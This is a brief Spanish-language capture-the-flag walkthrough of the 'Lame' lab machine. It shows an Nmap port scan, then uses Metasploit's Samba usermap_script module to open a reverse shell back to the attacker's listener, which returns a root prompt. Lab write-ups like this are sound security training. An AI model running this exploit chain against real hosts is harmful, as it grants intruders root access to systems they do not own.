>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/lame]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.42.90
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 10:35 EST
Nmap scan report for 10.129.42.90
Host is up (0.058s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.79 seconds
```

>Vemos ya que en el escaneo la máquina emplea **Samba de version 3.X** entonces podemos probar el exploit **usermap_script** de metasploit para ganar acceso a la máquina y obtenemos una shell como root así que ya terminamos la máquina:

```bash
msf exploit(multi/samba/usermap_script) > set LHOST 10.10.14.71
LHOST => 10.10.14.71
msf exploit(multi/samba/usermap_script) > set RHOSTS 10.129.42.90
RHOSTS => 10.129.42.90
msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.10.14.71:4444 
[*] Command shell session 1 opened (10.10.14.71:4444 -> 10.129.42.90:38996) at 2026-01-15 10:42:55 -0500

whoami
root
```
